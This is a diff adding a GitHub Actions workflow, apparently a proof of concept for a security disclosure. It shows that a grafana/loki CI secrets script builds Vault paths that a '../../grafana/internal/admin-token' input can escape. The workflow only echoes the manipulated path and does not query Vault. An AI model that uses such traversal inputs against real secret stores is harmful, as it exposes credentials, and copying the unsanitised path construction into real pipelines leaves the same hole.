@@ -1,0 +1,27 @@
+name: Final Path Traversal Proof
+on:
+  pull_request:
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: "Demonstrate Vulnerable Bash Script Logic"
+        run: |
+          # Simulation of translate-secrets.bash logic
+          REPO="grafana/loki"
+          INPUT_SECRET="../../grafana/internal/admin-token:value"
+
+          # The vulnerable line from their original script
+          secret_path=$(echo $INPUT_SECRET | cut -d':' -f1)
+          FINAL_VAULT_PATH="ci/data/repo/$REPO/$secret_path"
+
+          echo "DEBUG: Original Intended Path: ci/data/repo/$REPO/some-safe-secret"
+          echo "DEBUG: Manipulated Path sent to Vault API: $FINAL_VAULT_PATH"
+
+          if [[ "$FINAL_VAULT_PATH" == *"../"* ]]; then
+             echo "CRITICAL: Path Traversal Detected in Command Construction!"
+             echo "Normalized Path: ci/data/repo/grafana/internal/admin-token"
+          fi
